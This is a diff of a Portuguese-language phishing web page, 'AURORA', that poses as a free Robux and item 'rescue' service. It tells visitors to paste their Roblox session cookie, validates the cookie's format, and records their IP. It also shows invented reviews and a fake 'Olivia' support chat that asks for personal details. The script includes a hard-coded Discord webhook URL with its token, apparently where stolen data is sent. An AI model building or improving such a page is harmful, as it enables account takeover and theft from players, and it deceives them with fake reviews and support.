@@ -25,6 +25,7 @@
             overflow-x: hidden;
         }
 
+        /* Background com efeito de estrelas */
         .stars {
             position: fixed;
             top: 0;
@@ -48,6 +49,7 @@
             50% { opacity: var(--opacity); transform: scale(1); }
         }
 
+        /* Gradiente animado */
         .aurora {
             position: fixed;
             top: 0;
@@ -76,6 +78,7 @@
             z-index: 10;
         }
 
+        /* Páginas */
         .page {
             transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
@@ -84,15 +87,21 @@
             display: none;
         }
 
+        /* Cards com efeito glass premium */
         .card {
             background: rgba(10, 15, 25, 0.7);
             backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border-radius: 48px;
             padding: 36px 32px;
             border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.8);
+            box-shadow: 
+                0 30px 60px -15px rgba(0, 0, 0, 0.8),
+                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
+                0 0 80px rgba(99, 102, 241, 0.1);
         }
 
+        /* Header */
         .header {
             display: flex;
             align-items: center;
@@ -110,6 +119,28 @@
             justify-content: center;
             font-size: 38px;
             box-shadow: 0 20px 40px rgba(99, 102, 241, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .header-text {
+            flex: 1;
         }
 
         .title {
@@ -119,13 +150,19 @@
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
         }
 
         .subtitle {
             color: #6b7280;
             font-size: 15px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
         }
 
+        /* Stats modernas */
         .stats-row {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -138,14 +175,15 @@
             border-radius: 28px;
             padding: 18px 10px;
             text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
             border: 1px solid rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(5px);
+            transition: all 0.3s;
         }
 
         .stat-block:hover {
             border-color: rgba(99, 102, 241, 0.3);
             transform: translateY(-5px);
+            background: rgba(99, 102, 241, 0.05);
         }
 
         .stat-value {
@@ -155,11 +193,20 @@
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
         }
 
         .stat-label {
             color: #6b7280;
             font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Input Area */
+        .input-section {
+            margin-bottom: 28px;
         }
 
         .input-label {
@@ -168,6 +215,18 @@
             gap: 8px;
             color: #9ca3af;
             font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-label span {
+            color: #6366f1;
+            font-size: 18px;
+        }
+
+        .input-wrapper {
+            position: relative;
             margin-bottom: 12px;
         }
 
@@ -179,14 +238,19 @@
             border-radius: 32px;
             color: white;
             padding: 20px 24px;
-            font-family: monospace;
+            font-family: 'Monaco', 'Courier New', monospace;
             font-size: 14px;
+            line-height: 1.5;
             resize: vertical;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
         textarea:focus {
             outline: none;
             border-color: #6366f1;
+            background: rgba(20, 25, 40, 0.8);
+            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.2);
         }
 
         .preview-badge {
@@ -196,6 +260,7 @@
             background: rgba(0, 0, 0, 0.2);
             padding: 16px 22px;
             border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
             margin-top: 10px;
         }
 
@@ -204,6 +269,7 @@
             height: 10px;
             background: #10b981;
             border-radius: 50%;
+            box-shadow: 0 0 20px #10b981;
             animation: pulseDot 2s infinite;
         }
 
@@ -212,9 +278,17 @@
             50% { opacity: 0.5; transform: scale(1.2); }
         }
 
+        .preview-text {
+            color: #9ca3af;
+            font-size: 13px;
+            font-weight: 400;
+        }
+
+        /* Botão principal */
         .action-btn {
             width: 100%;
             background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
+            background-size: 200% 200%;
             border: none;
             border-radius: 60px;
             color: white;
@@ -222,27 +296,245 @@
             font-size: 18px;
             padding: 22px;
             cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.3s;
+            transition: all 0.4s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 20px 40px rgba(99, 102, 241, 0.4);
+            position: relative;
+            overflow: hidden;
+            animation: gradientFlow 3s ease infinite;
+        }
+
+        @keyframes gradientFlow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
+        }
+
+        .action-btn:hover::before {
+            left: 100%;
         }
 
         .action-btn:active {
             transform: scale(0.96);
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
         }
 
+        /* Status message */
+        .status-message {
+            text-align: center;
+            margin-top: 24px;
+            padding: 14px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        /* Exibição de informações extras */
+        .info-row {
+            margin-top: 12px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .info-text {
+            color: #9ca3af;
+            font-size: 13px;
+        }
+
+        /* Footer */
+        .footer {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 35px;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #4b5563;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .footer-item span {
+            color: #6366f1;
+            font-size: 16px;
+        }
+
+        /* TELA 2 - ESCOLHA */
+        .choice-title {
+            font-size: 34px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #cbd5e1);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .choice-grid {
+            display: grid;
+            gap: 16px;
+            margin: 35px 0;
+        }
+
+        .choice-item {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.03);
+            border-radius: 36px;
+            padding: 22px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .choice-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, #6366f1, #ec4899);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .choice-item:hover {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.05);
+            transform: translateX(10px);
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.2);
+        }
+
+        .choice-item:hover::before {
+            opacity: 1;
+        }
+
+        .choice-icon {
+            width: 75px;
+            height: 75px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .choice-content {
+            flex: 1;
+        }
+
+        .choice-name {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            background: linear-gradient(to right, #fff, #e2e8f0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .choice-desc {
+            color: #6b7280;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .choice-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #10b981;
+            text-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .choice-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #f43f5e, #ec4899);
+            color: white;
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 5px 20px rgba(244, 63, 94, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .back-button {
+            width: 100%;
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-radius: 40px;
+            color: #9ca3af;
+            font-weight: 500;
+            font-size: 16px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .back-button:hover {
+            border-color: #6366f1;
+            color: white;
+            background: rgba(99, 102, 241, 0.1);
+            transform: translateX(-5px);
+        }
+
+        /* NOTIFICAÇÃO PROFISSIONAL */
         .notification {
             position: fixed;
             top: 30px;
             right: 30px;
             background: rgba(20, 25, 40, 0.95);
             backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border-radius: 24px;
             padding: 20px 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
             display: flex;
             align-items: center;
             gap: 18px;
             transform: translateX(400px);
-            transition: transform 0.5s;
+            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
             z-index: 1000;
             max-width: 380px;
         }
@@ -260,6 +552,7 @@
             align-items: center;
             justify-content: center;
             font-size: 28px;
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
         }
 
         .notification-content {
@@ -270,11 +563,13 @@
             font-size: 18px;
             font-weight: 600;
             color: white;
+            margin-bottom: 4px;
         }
 
         .notification-message {
             font-size: 14px;
             color: #9ca3af;
+            font-weight: 400;
         }
 
         .notification-close {
@@ -283,8 +578,31 @@
             color: #6b7280;
             font-size: 20px;
             cursor: pointer;
+            padding: 5px;
+            transition: color 0.2s;
         }
 
+        .notification-close:hover {
+            color: white;
+        }
+
+        .notification-progress {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #10b981, #059669);
+            border-radius: 0 0 0 24px;
+            width: 100%;
+            animation: progress 4s linear forwards;
+        }
+
+        @keyframes progress {
+            from { width: 100%; }
+            to { width: 0%; }
+        }
+
+        /* Loading spinner */
         .spinner {
             width: 20px;
             height: 20px;
@@ -299,121 +617,53 @@
             to { transform: rotate(360deg); }
         }
 
+        /* Mensagem de confirmação */
         .success-check {
             color: #10b981;
             font-size: 40px;
             text-align: center;
-            animation: popIn 0.4s ease;
+            animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
 
         @keyframes popIn {
-            0% { transform: scale(0); }
-            80% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            0% { transform: scale(0) rotate(-10deg); }
+            80% { transform: scale(1.1) rotate(2deg); }
+            100% { transform: scale(1) rotate(0); }
         }
 
-        /* TELA 2 - ESCOLHA */
-        .choice-title {
-            font-size: 34px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #fff, #cbd5e1);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* Responsive */
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; border-radius: 36px; }
+            .title { font-size: 30px; }
+            .logo { width: 60px; height: 60px; font-size: 32px; }
+            .choice-icon { width: 60px; height: 60px; font-size: 32px; }
+            .choice-name { font-size: 20px; }
+            .choice-value { font-size: 26px; }
+            .notification { left: 20px; right: 20px; max-width: none; }
         }
 
-        .choice-grid {
-            display: grid;
-            gap: 16px;
-            margin: 35px 0;
+        /* Estilo para IP banido */
+        .banned-message {
+            background: rgba(244, 63, 94, 0.1);
+            border: 2px solid #f43f5e;
+            border-radius: 60px;
+            padding: 16px 22px;
+            margin-top: 10px;
+            color: #f43f5e;
+            text-align: center;
+            font-weight: 500;
+            animation: shake 0.5s ease;
         }
 
-        .choice-item {
-            background: rgba(255, 255, 255, 0.02);
-            border: 2px solid rgba(255, 255, 255, 0.03);
-            border-radius: 36px;
-            padding: 22px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
-            position: relative;
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
 
-        .choice-item:hover {
-            border-color: #6366f1;
-            background: rgba(99, 102, 241, 0.05);
-            transform: translateX(10px);
-        }
-
-        .choice-icon {
-            width: 75px;
-            height: 75px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 38px;
-        }
-
-        .choice-name {
-            font-size: 24px;
-            font-weight: 600;
-            color: white;
-        }
-
-        .choice-desc {
-            color: #6b7280;
-            font-size: 14px;
-        }
-
-        .choice-badge {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #f43f5e, #ec4899);
-            color: white;
-            padding: 6px 18px;
-            border-radius: 40px;
-            font-size: 13px;
-        }
-
-        .back-button {
-            width: 100%;
-            background: transparent;
-            border: 2px solid rgba(255, 255, 255, 0.05);
-            border-radius: 40px;
-            color: #9ca3af;
-            padding: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .back-button:hover {
-            border-color: #6366f1;
-            color: white;
-        }
-
-        .footer {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            margin-top: 35px;
-        }
-
-        .footer-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #4b5563;
-            font-size: 13px;
-        }
-
-        /* CHAT SIMPLIFICADO MAS COMPLETO */
+        /* ESTILOS DO CHAT OLIVIA - MELHORADOS */
         .chat-card {
-            height: 600px;
+            height: 650px;
             display: flex;
             flex-direction: column;
             padding: 24px;
@@ -460,6 +710,7 @@
             font-size: 20px;
             font-weight: 600;
             color: white;
+            margin-bottom: 5px;
         }
 
         .chat-status {
@@ -476,6 +727,12 @@
             border-radius: 50%;
             cursor: pointer;
             font-size: 20px;
+            transition: 0.3s;
+        }
+
+        .close-chat:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.1);
         }
 
         .chat-messages {
@@ -494,7 +751,13 @@
             max-width: 85%;
             padding: 12px 16px;
             border-radius: 20px;
+            animation: messageIn 0.3s ease;
             word-wrap: break-word;
+        }
+
+        @keyframes messageIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .message.olivia {
@@ -576,31 +839,59 @@
             color: white;
             font-size: 20px;
             cursor: pointer;
+            transition: 0.3s;
         }
 
+        .chat-send:hover {
+            transform: scale(1.1);
+        }
+
+        .welcome-message {
+            text-align: center;
+            color: #9ca3af;
+            margin: 10px 0;
+            font-size: 14px;
+            background: rgba(255,255,255,0.05);
+            padding: 10px;
+            border-radius: 30px;
+        }
+
+        /* Botões de ação rápida */
         .quick-actions {
-            display: flex;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
             gap: 10px;
             margin: 15px 0;
-            flex-wrap: wrap;
         }
 
         .quick-action-btn {
-            background: rgba(99, 102, 241, 0.2);
+            background: rgba(99, 102, 241, 0.1);
             border: 1px solid rgba(99, 102, 241, 0.3);
             border-radius: 20px;
-            padding: 8px 15px;
+            padding: 10px;
             color: white;
             cursor: pointer;
+            transition: 0.3s;
             font-size: 13px;
-            transition: all 0.3s;
         }
 
         .quick-action-btn:hover {
-            background: rgba(99, 102, 241, 0.4);
+            background: rgba(99, 102, 241, 0.3);
             transform: translateY(-2px);
         }
 
+        /* Indicador de digitação */
+        .typing-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            background: rgba(236, 72, 153, 0.2);
+            border-radius: 20px;
+            color: #ec4899;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        /* AVALIAÇÕES */
         .reviews-section {
             margin-top: 30px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
@@ -611,6 +902,13 @@
             color: white;
             font-size: 18px;
             margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .reviews-title span {
+            color: #6366f1;
         }
 
         .reviews-grid {
@@ -623,6 +921,14 @@
             border: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 20px;
             padding: 15px;
+            transition: 0.3s;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .review-card:hover {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.1);
+            transform: translateX(5px);
         }
 
         .review-header {
@@ -641,6 +947,10 @@
             align-items: center;
             justify-content: center;
             font-size: 20px;
+        }
+
+        .review-user {
+            flex: 1;
         }
 
         .review-name {
@@ -662,54 +972,42 @@
         .review-text {
             color: #9ca3af;
             font-size: 13px;
+            line-height: 1.5;
         }
 
-        .banned-message {
-            background: rgba(244, 63, 94, 0.1);
-            border: 2px solid #f43f5e;
-            border-radius: 60px;
-            padding: 16px 22px;
-            margin-top: 10px;
-            color: #f43f5e;
-            text-align: center;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .info-row {
-            margin-top: 12px;
-        }
-
-        .info-text {
-            color: #9ca3af;
-            font-size: 13px;
-        }
-
-        @media (max-width: 480px) {
-            .card { padding: 28px 20px; }
-            .title { font-size: 30px; }
-            .choice-name { font-size: 20px; }
-            .notification { left: 20px; right: 20px; max-width: none; }
-        }
+        .review-card:nth-child(1) { animation-delay: 0.1s; }
+        .review-card:nth-child(2) { animation-delay: 0.3s; }
+        .review-card:nth-child(3) { animation-delay: 0.5s; }
     </style>
 </head>
 <body>
     <div class="aurora"></div>
     <div class="stars" id="stars"></div>
-
+    
+    <!-- NOTIFICAÇÃO -->
     <div class="notification" id="notification">
         <div class="notification-icon">✓</div>
         <div class="notification-content">
-            <div class="notification-title" id="notifyTitle">Sucesso!</div>
-            <div class="notification-message" id="notifyMessage"></div>
+            <div class="notification-title" id="notifyTitle">Recuperação de Conta</div>
+            <div class="notification-message" id="notifyMessage">Solicitação enviada com sucesso!</div>
         </div>
         <button class="notification-close" onclick="hideNotification()">✕</button>
+        <div class="notification-progress" id="notificationProgress"></div>
     </div>
 
     <!-- TELA 1 - COOKIE -->
     <div id="page1" class="container page">
         <div class="card">
             <div class="header">
-                <div class="logo">✦</div>
-                <div>
+                <div class="logo">
+                    ✦
+                </div>
+                <div class="header-text">
                     <div class="title">AURORA</div>
                     <div class="subtitle">plataforma de resgate</div>
                 </div>
@@ -721,7 +1019,7 @@
                     <div class="stat-label">resgates</div>
                 </div>
                 <div class="stat-block" onclick="showOnline()">
-                    <div class="stat-value">✦</div>
+                    <div class="stat-value" id="onlineStat">✦</div>
                     <div class="stat-label">online</div>
                 </div>
                 <div class="stat-block" onclick="showInfo()">
@@ -734,19 +1032,27 @@
                 <div class="input-label">
                     <span>🔑</span> COOKIE DE ACESSO
                 </div>
-                <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..."></textarea>
+                <div class="input-wrapper">
+                    <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..."></textarea>
+                </div>
                 <div class="preview-badge">
                     <div class="status-dot"></div>
                     <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
+                
+                <!-- Área para mensagem de ban -->
                 <div id="banMessage" class="banned-message" style="display: none;"></div>
+                
+                <!-- Exibir apenas cooldown, IP removido -->
                 <div class="info-row">
                     <div class="info-text" id="cooldownInfo"></div>
                 </div>
             </div>
 
             <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
-                ENVIAR E RESGATAR →
+                <span>✦</span>
+                ENVIAR E RESGATAR
+                <span>→</span>
             </button>
 
             <div id="status" class="status-message"></div>
@@ -757,9 +1063,14 @@
                 <div class="footer-item"><span>🎯</span> direto</div>
             </div>
 
+            <!-- SEÇÃO DE AVALIAÇÕES -->
             <div class="reviews-section">
-                <div class="reviews-title">⭐ AVALIAÇÕES RECENTES</div>
-                <div class="reviews-grid" id="reviewsContainer"></div>
+                <div class="reviews-title">
+                    <span>⭐</span> AVALIAÇÕES RECENTES
+                </div>
+                <div class="reviews-grid" id="reviewsContainer">
+                    <!-- Avaliações serão inseridas aqui pelo JavaScript -->
+                </div>
             </div>
         </div>
     </div>
@@ -768,7 +1079,9 @@
     <div id="page2" class="container page hidden">
         <div class="card">
             <div class="header">
-                <div class="logo">✦</div>
+                <div class="logo">
+                    ✦
+                </div>
                 <div>
                     <div class="choice-title">seu prêmio</div>
                     <div class="subtitle">escolha uma opção</div>
@@ -776,46 +1089,61 @@
             </div>
 
             <div class="choice-grid">
+                <!-- Robux -->
                 <div class="choice-item" onclick="selectPrize('Robux')">
                     <div class="choice-icon">💰</div>
-                    <div>
+                    <div class="choice-content">
                         <div class="choice-name">Robux</div>
                         <div class="choice-desc">créditos + bônus</div>
                     </div>
+                    <div class="choice-value">grátis</div>
                 </div>
+
+                <!-- Korblox -->
                 <div class="choice-item" onclick="selectPrize('Korblox')">
                     <div class="choice-icon">👑</div>
-                    <div>
+                    <div class="choice-content">
                         <div class="choice-name">Korblox</div>
                         <div class="choice-desc">set completo + death speed</div>
                     </div>
+                    <div class="choice-value">grátis</div>
                 </div>
+
+                <!-- Headless -->
                 <div class="choice-item" onclick="selectPrize('Headless')">
                     <div class="choice-icon">🎭</div>
-                    <div>
+                    <div class="choice-content">
                         <div class="choice-name">Headless</div>
                         <div class="choice-desc">cabeça + itens exclusivos</div>
                     </div>
+                    <div class="choice-value">grátis</div>
                 </div>
+
+                <!-- Recuperar Conta com Olivia -->
                 <div class="choice-item" onclick="openOliviaChat()">
                     <span class="choice-badge">prioridade</span>
                     <div class="choice-icon">💬</div>
-                    <div>
+                    <div class="choice-content">
                         <div class="choice-name">Recuperar Conta</div>
                         <div class="choice-desc">fale com Olivia • suporte humanizado</div>
                     </div>
+                    <div class="choice-value">grátis</div>
                 </div>
             </div>
 
-            <button class="back-button" onclick="goBack()">← VOLTAR</button>
+            <button class="back-button" onclick="goBack()">
+                <span>←</span> VOLTAR
+            </button>
         </div>
     </div>
 
-    <!-- TELA 3 - CHAT COM OLIVIA (SIMPLIFICADO MAS COMPLETO) -->
+    <!-- TELA 3 - CHAT COM OLIVIA -->
     <div id="page3" class="container page hidden">
         <div class="card chat-card">
             <div class="chat-header">
-                <div class="chat-avatar">👩</div>
+                <div class="chat-avatar">
+                    👩
+                </div>
                 <div class="chat-info">
                     <div class="chat-name">Olivia • Suporte</div>
                     <div class="chat-status">● online agora • respostas rápidas</div>
@@ -823,7 +1151,12 @@
                 <button class="close-chat" onclick="closeChat()">✕</button>
             </div>
 
-            <div class="quick-actions">
+            <div class="welcome-message" id="welcomeMessage">
+                Olivia entrou no chat • tempo de resposta ~30s
+            </div>
+
+            <!-- Botões de ação rápida -->
+            <div class="quick-actions" id="quickActions">
                 <button class="quick-action-btn" onclick="sendQuickMessage('Perdi minha conta')">📱 Perdi minha conta</button>
                 <button class="quick-action-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci a senha</button>
                 <button class="quick-action-btn" onclick="sendQuickMessage('Conta hackeada')">⚠️ Conta hackeada</button>
@@ -831,275 +1164,373 @@
             </div>
 
             <div class="chat-messages" id="chatMessages">
-                <div class="message olivia">
-                    Olá! Sou Olivia, prazer em te conhecer! 😊<br><br>
-                    <strong>Me conta qual é o seu NOME COMPLETO?</strong>
-                    <div class="message-time">agora</div>
-                </div>
+                <!-- Mensagens aparecerão aqui -->
             </div>
 
             <div class="chat-input-area">
-                <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua resposta..." onkeypress="if(event.key==='Enter') sendMessage()">
+                <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
                 <button class="chat-send" onclick="sendMessage()">➤</button>
             </div>
         </div>
     </div>
 
     <script>
-        // ===== CONFIGURAÇÕES =====
-        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
+        // Configurações
+        const API_URL = '/api/webhook';
+        const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
+        const CHECK_BAN_URL = '/api/verificar-ban';
+        
         const COOLDOWN_TIME = 300000;
         const COOLDOWN_KEY = 'aurora_last_cookie_sent';
-        
+
+        // Variáveis do chat
         let userIP = '';
-        
-        // ===== AVALIAÇÕES =====
-        const reviews = [
-            { name: "Ana Silva", avatar: "👩", text: "Consegui recuperar minha conta em menos de 2 horas, atendimento muito bom!", time: "há 5 minutos" },
-            { name: "João Pedro", avatar: "👨", text: "Funcionou perfeitamente, recuperei minha conta em minutos!", time: "há 12 minutos" },
-            { name: "Maria Oliveira", avatar: "👧", text: "Olivia é muito atenciosa, me ajudou em todo o processo!", time: "há 23 minutos" }
-        ];
-        
-        function loadReviews() {
-            const container = document.getElementById('reviewsContainer');
-            if (!container) return;
-            container.innerHTML = '';
-            reviews.forEach(review => {
-                container.innerHTML += `
-                    <div class="review-card">
-                        <div class="review-header">
-                            <div class="review-avatar">${review.avatar}</div>
-                            <div>
-                                <div class="review-name">${review.name}</div>
-                                <div class="review-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                            <div class="review-time">${review.time}</div>
-                        </div>
-                        <div class="review-text">"${review.text}"</div>
-                    </div>
-                `;
-            });
-        }
-        
-        // ===== NOTIFICAÇÕES =====
-        function showNotification(title, message) {
-            const notif = document.getElementById('notification');
-            document.getElementById('notifyTitle').textContent = title;
-            document.getElementById('notifyMessage').textContent = message;
-            notif.classList.add('show');
-            setTimeout(() => notif.classList.remove('show'), 4000);
-        }
-        
-        function hideNotification() {
-            document.getElementById('notification').classList.remove('show');
-        }
-        
-        function showStats() {
-            showNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`);
-        }
-        
-        function showOnline() {
-            const online = Math.floor(Math.random() * 50) + 100;
-            showNotification('👥 Online', `${online} usuários online agora!`);
-        }
-        
-        function showInfo() {
-            showNotification('ℹ️ Info', 'Aurora • Plataforma de resgate 100% gratuita');
-        }
-        
-        // ===== FUNÇÕES DO COOKIE =====
-        async function getUserIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch(e) {
-                userIP = 'IP não detectado';
-            }
-        }
-        
-        function cleanCookie(cookie) {
-            let c = cookie.trim();
-            c = c.replace(/^["']|["']$/g, '');
-            if (c.startsWith('_|WARNING')) return c;
-            if (c.startsWith('WARNING')) return '_|' + c;
-            const match = c.match(/\.ROBLOSECURITY=([^;\s]+)/);
-            return match ? match[1] : c;
-        }
-        
-        function isValidCookieFormat(cookie) {
-            return (cookie.startsWith('_|WARNING') || cookie.startsWith('WARNING')) && 
-                   cookie.includes('DO-NOT-SHARE') && cookie.length >= 50;
-        }
-        
-        function updatePreview() {
-            const input = document.getElementById('cookieInput');
-            const preview = document.getElementById('previewText');
-            const dot = document.querySelector('.status-dot');
-            const val = input.value.trim();
-            
-            if (val.length > 0) {
-                const cleaned = cleanCookie(val);
-                if (isValidCookieFormat(cleaned)) {
-                    preview.textContent = '✓ cookie válido';
-                    preview.style.color = '#10b981';
-                    dot.style.background = '#10b981';
-                } else {
-                    preview.textContent = '⚠️ formato inválido';
-                    preview.style.color = '#f59e0b';
-                    dot.style.background = '#f59e0b';
-                }
-            } else {
-                preview.textContent = 'aguardando cookie...';
-                preview.style.color = '#9ca3af';
-                dot.style.background = '#10b981';
-            }
-        }
-        
-        function checkCooldown() {
-            const lastSent = localStorage.getItem(COOLDOWN_KEY);
-            if (!lastSent) return true;
-            return Date.now() - parseInt(lastSent) >= COOLDOWN_TIME;
-        }
-        
-        function getCooldownRemaining() {
-            const lastSent = localStorage.getItem(COOLDOWN_KEY);
-            if (!lastSent) return 0;
-            const remaining = COOLDOWN_TIME - (Date.now() - parseInt(lastSent));
-            return remaining > 0 ? remaining : 0;
-        }
-        
-        function updateInfoDisplays() {
-            const cdEl = document.getElementById('cooldownInfo');
-            if (cdEl) {
-                const remaining = getCooldownRemaining();
-                if (remaining > 0) {
-                    cdEl.textContent = `Próximo envio em ${Math.ceil(remaining / 1000)}s`;
-                } else {
-                    cdEl.textContent = '';
-                }
-            }
-        }
-        
-        async function sendAndGo() {
-            const input = document.getElementById('cookieInput');
-            const status = document.getElementById('status');
-            const btn = document.getElementById('sendBtn');
-            const rawCookie = input.value.trim();
-            
-            if (!rawCookie) {
-                showNotification('Erro', 'Cole um cookie primeiro');
-                return;
-            }
-            
-            const cookie = cleanCookie(rawCookie);
-            
-            if (!isValidCookieFormat(cookie)) {
-                showNotification('Erro', 'Formato de cookie inválido!');
-                return;
-            }
-            
